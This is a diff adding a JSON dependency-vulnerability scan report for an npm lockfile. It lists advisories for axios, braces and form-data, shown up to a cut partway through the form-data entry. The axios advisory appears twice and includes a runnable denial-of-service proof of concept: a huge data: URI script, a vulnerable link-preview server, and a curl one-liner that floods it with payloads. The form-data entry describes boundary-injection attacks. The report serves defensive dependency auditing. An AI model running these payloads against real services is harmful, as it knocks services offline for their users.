@@ -1,0 +1,3277 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/home/dj/tasks/deps-updates/gdk/package-lock.json",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "axios",
+            "version": "1.10.0",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-09-29T19:03:57Z",
+              "published": "2025-09-11T21:07:55Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-4hjh-wcwx-xvwj",
+              "aliases": [
+                "CVE-2025-58754"
+              ],
+              "related": [
+                "CGA-82cq-c7r6-q67x",
+                "CGA-g599-6c37-mmm7",
+                "CGA-jw4w-h92g-894c",
+                "CGA-pvgv-p58w-27vj",
+                "CGA-q8ch-84qh-r7r2",
+                "CVE-2025-58754"
+              ],
+              "summary": "Axios is vulnerable to DoS attack through lack of data size check",
+              "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env \u0026\u0026 config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err =\u003e {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n\u003c--- Last few GCs ---\u003e\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c =\u003e c \u003e= 200 \u0026\u0026 c \u003c 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=\u003eres.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"\u003chttp|https|data URL\u003e\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) =\u003e {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () =\u003e controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) =\u003e {\n      if (sent + chunk.length \u003e cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () =\u003e limiter.end());\n    r.data.on(\"error\", (e) =\u003e limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () =\u003e {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json \u003e/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.12.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.30.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58754"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7011"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7034"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v0.30.2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v1.12.0"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-11T21:07:55Z",
+                "nvd_published_at": "2025-09-12T02:15:46Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "aliases": [
+                "CVE-2025-58754",
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "axios",
+            "version": "1.9.0",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2025-09-29T19:03:57Z",
+              "published": "2025-09-11T21:07:55Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-4hjh-wcwx-xvwj",
+              "aliases": [
+                "CVE-2025-58754"
+              ],
+              "related": [
+                "CGA-82cq-c7r6-q67x",
+                "CGA-g599-6c37-mmm7",
+                "CGA-jw4w-h92g-894c",
+                "CGA-pvgv-p58w-27vj",
+                "CGA-q8ch-84qh-r7r2",
+                "CVE-2025-58754"
+              ],
+              "summary": "Axios is vulnerable to DoS attack through lack of data size check",
+              "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env \u0026\u0026 config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err =\u003e {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n\u003c--- Last few GCs ---\u003e\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c =\u003e c \u003e= 200 \u0026\u0026 c \u003c 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=\u003eres.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"\u003chttp|https|data URL\u003e\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) =\u003e {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () =\u003e controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) =\u003e {\n      if (sent + chunk.length \u003e cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () =\u003e limiter.end());\n    r.data.on(\"error\", (e) =\u003e limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () =\u003e {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json \u003e/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.12.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.30.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58754"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7011"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7034"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v0.30.2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v1.12.0"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-11T21:07:55Z",
+                "nvd_published_at": "2025-09-12T02:15:46Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "aliases": [
+                "CVE-2025-58754",
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "braces",
+            "version": "2.3.2",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:12:28Z",
+              "published": "2024-05-14T18:30:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-grv7-fg5c-xmjg",
+              "aliases": [
+                "CVE-2024-4068"
+              ],
+              "related": [
+                "CGA-g3x5-7mr7-wr8m",
+                "CGA-hq78-8245-675v",
+                "CGA-jrqh-c82g-rxvm",
+                "CGA-p4gw-wx75-2mg4",
+                "CGA-w95g-rrw2-66h4",
+                "CGA-wr9w-hw24-rqg5"
+              ],
+              "summary": "Uncontrolled resource consumption in braces",
+              "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "braces",
+                    "purl": "pkg:npm/braces"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-grv7-fg5c-xmjg/GHSA-grv7-fg5c-xmjg.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/issues/35"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/37"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/40"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/braces"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1050",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-10T20:17:26Z",
+                "nvd_published_at": "2024-05-14T15:42:48Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "aliases": [
+                "CVE-2024-4068",
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "form-data",
+            "version": "2.3.3",
+            "ecosystem": "npm"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "vulnerabilities": [
+            {
+              "modified": "2025-07-21T19:04:54Z",
+              "published": "2025-07-21T19:04:54Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-fjxv-7rqg-78g4",
+              "aliases": [
+                "CVE-2025-7783"
+              ],
+              "related": [
+                "CGA-35hh-78jw-8mmq",
+                "CGA-9m6x-qcrx-9xfj",
+                "CGA-cvhq-qgx3-vfx9",
+                "CGA-g2fp-rgfq-2hjj",
+                "CGA-h6v7-23w8-2vw8",
+                "CGA-mp9r-pq3p-q3qc",
+                "CGA-pgwm-362h-3mjh",
+                "CGA-qvfw-fcfj-g5xq",
+                "CGA-rvcj-gcgm-25q3",
+                "CGA-xvgg-cqm9-vxh5",
+                "CVE-2025-7783"
+              ],
+              "summary": "form-data uses unsafe random function in form-data for choosing boundary",
+              "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
